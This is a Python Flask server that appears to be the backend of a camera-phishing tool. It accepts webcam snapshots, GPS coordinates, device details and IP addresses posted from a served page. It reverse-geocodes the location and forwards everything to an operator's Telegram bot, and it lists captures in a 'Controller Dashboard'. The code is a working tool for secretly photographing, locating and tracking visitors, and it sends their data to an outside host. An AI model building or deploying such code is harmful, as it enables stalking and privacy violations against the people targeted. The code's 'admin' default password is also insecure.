from flask import Flask, request, send_file, jsonify, Response
from werkzeug.middleware.proxy_fix import ProxyFix
import os, base64, datetime, binascii, requests, json

app = Flask(__name__)
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)

TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "admin")
LOG_FILE = "capture_log.json"

def check_auth(auth):
    return auth and auth.username == "admin" and auth.password == ADMIN_PASSWORD

def get_address(location_string):
    if not location_string or "denied" in location_string or "not supported" in location_string or "error" in location_string:
        return location_string 
    try:
        parts = location_string.split(",")
        if len(parts) == 2:
            lat = parts[0].strip()
            lon = parts[1].strip()
            url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lon}"
            headers = {'User-Agent': 'EducationalDemo/1.0'}
            res = requests.get(url, headers=headers, timeout=5)
            if res.status_code == 200:
                data = res.json()
                return data.get("display_name", "Unknown Address")
    except Exception as e:
        print("Geocode error:", e)
    return "Unknown Address"

@app.route("/")
def index():
    return send_file("index.html")

@app.route("/gallery")
def gallery():
    auth = request.authorization
    if not check_auth(auth):
        return Response('Login required', 401, {'WWW-Authenticate': 'Basic realm="Admin"'})
    
    logs = []
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            try:
                logs = json.load(f)
            except:
                pass
                
    logs.reverse()
    tg_link = f"https://t.me/{TELEGRAM_CHAT_ID}" if TELEGRAM_CHAT_ID else "#"
    
    html = f"""
    <!doctype html>
    <html><head><title>Controller Dashboard</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        :root {{ --bg: #0f172a; --card: #1e293b; --text: #e2e8f0; --accent: #38bdf8; --danger: #ef4444; --tg: #229ED9; }}
        body {{ font-family: system-ui, -apple-system, sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 20px; }}
        .header {{ display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #334155; padding-bottom: 15px; margin-bottom: 20px; }}
        .header h1 {{ margin: 0; color: var(--accent); font-size: 24px; }}
        .btn {{ background: var(--accent); color: #0f172a; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; text-decoration: none; font-size: 14px; transition: 0.2s; display: inline-block; }}
        .btn:hover {{ opacity: 0.8; }}
        .btn-tg {{ background: var(--tg); color: white; font-size: 16px; padding: 15px 30px; display: block; margin: 20px auto; text-align: center; max-width: 300px; border-radius: 50px; box-shadow: 0 4px 15px rgba(34, 158, 217, 0.4); }}
        .btn-tg:hover {{ transform: scale(1.05); }}
        .stats {{ display: flex; gap: 15px; margin-bottom: 20px; flex-wrap: wrap; }}
        .stat-box {{ background: var(--card); padding: 20px; border-radius: 12px; flex: 1; min-width: 200px; border: 1px solid #334155; text-align: center; }}
        .stat-box h3 {{ margin: 0 0 10px 0; font-size: 14px; color: #94a3b8; text-transform: uppercase; letter-spacing: 1px; }}
        .stat-box p {{ margin: 0; font-size: 32px; font-weight: bold; color: var(--accent); }}
        .list {{ display: flex; flex-direction: column; gap: 10px; }}
        .log-item {{ background: var(--card); padding: 15px; border-radius: 8px; border-left: 4px solid var(--accent); display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }}
        .log-time {{ color: #94a3b8; font-size: 12px; }}
        .log-loc {{ font-weight: bold; color: #10b981; font-size: 15px; }}
        .log-device {{ color: #94a3b8; font-size: 11px; margin-top: 4px; display: block; max-width: 400px; }}
        .log-session {{ background: #38bdf8; color: #0f172a; padding: 2px 6px; border-radius: 4px; font-weight: bold; font-size: 12px; margin-right: 8px; }}
        .no-data {{ text-align: center; padding: 40px; color: #64748b; font-size: 18px; }}
    </style>
    <script>
        function refreshPage() {{ window.location.reload(); }}
    </script>
    </head><body>
    
    <div class="header">
        <h1>📷 Controller Dashboard</h1>
        <div>
            <button class="btn" onclick="refreshPage()">🔄 Sync Status</button>
            <a href="/" class="btn" style="background:#334155; color:white;">Open Camera</a>
        </div>
    </div>

    <div class="stats">
        <div class="stat-box"><h3>Server Status</h3><p style="color:#10b981">Online</p></div>
        <div class="stat-box"><h3>Telegram Bot</h3><p style="color:{'#10b981' if TELEGRAM_TOKEN else '#ef4444'}">{'Connected' if TELEGRAM_TOKEN else 'Error'}</p></div>
        <div class="stat-box"><h3>Storage</h3><p style="color:#38bdf8">Telegram Cloud</p></div>
    </div>

    <a href="{tg_link}" target="_blank" class="btn btn-tg">
        ✈️ Open Telegram to View Photos
    </a>

    <h3 style="color:var(--accent); margin-top: 30px;">Capture History</h3>
    <div class="list">
    """
    
    if not logs:
        html += "<div class='no-data'>No captures yet.</div>"
        
    for item in logs:
        html += f"""
        <div class="log-item">
            <div>
                <span class="log-time">📅 {item.get('time', '')}</span><br>
                <span class="log-session">{item.get('session', 'UNKNOWN')}</span>
                <span class="log-loc">📍 {item.get('address', 'Unknown')}</span>
                <span class="log-device">🌐 IP: {item.get('ip', 'Unknown')} | {item.get('extra', '')}</span>
                <span class="log-device">📱 {item.get('device', 'Unknown Device')[:80]}...</span>
            </div>
            <a href="{item.get('map_link', '#')}" target="_blank" class="btn" style="padding: 8px 15px; font-size: 13px; background:#10b981; color:white;">View Map</a>
        </div>
        """
        
    html += "</div></body></html>"
    return html

@app.route("/shot", methods=["POST"])
def shot():
    data = request.get_json(force=True)
    b64 = (data.get("img") or "").split(",", 1)[-1]
    raw_loc = data.get("loc", "Unknown Location")
    device_info = data.get("device", "Unknown Device")
    extra_info = data.get("extra", "No extra info")
    session_id = data.get("session", "UNKNOWN")
    
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if user_ip:
        user_ip = user_ip.split(',')[0]
    
    if b64 and TELEGRAM_TOKEN and TELEGRAM_CHAT_ID:
        try:
            address = get_address(raw_loc)
            map_link = f"https://www.google.com/maps?q={raw_loc.replace(' ', '')}" if "," in raw_loc else "#"
            
            img_data = base64.b64decode(b64)
            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
            files = {'photo': ('image.jpg', img_data, 'image/jpeg')}
            
            caption_text = (
                f"🆔 Session: {session_id}\n"
                f"📸 Capture: {datetime.datetime.now():%Y-%m-%d %H:%M:%S}\n"
                f"📍 Location: {address}\n"
                f"🗺️ Map: {map_link}\n"
                f"🌐 IP: {user_ip}\n"
                f"⚙️ {extra_info}\n"
                f"📱 Device: {device_info[:60]}..."
            )
            
            payload = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption_text}
            
            tg_res = requests.post(url, data=payload, files=files)
            if tg_res.status_code != 200:
                print("Telegram API Error:", tg_res.text)

            log_entry = {
                "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "address": address,
                "map_link": map_link,
                "device": device_info,
                "extra": extra_info,
                "ip": user_ip,
                "session": session_id
            }
            
            logs = []
            if os.path.exists(LOG_FILE):
                with open(LOG_FILE, "r") as f:
                    try: logs = json.load(f)
                    except: pass
            logs.append(log_entry)
            
            with open(LOG_FILE, "w") as f:
                json.dump(logs, f)
                
        except Exception as e:
            print("Error processing shot:", e)
            
    return "", 204

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8000)))
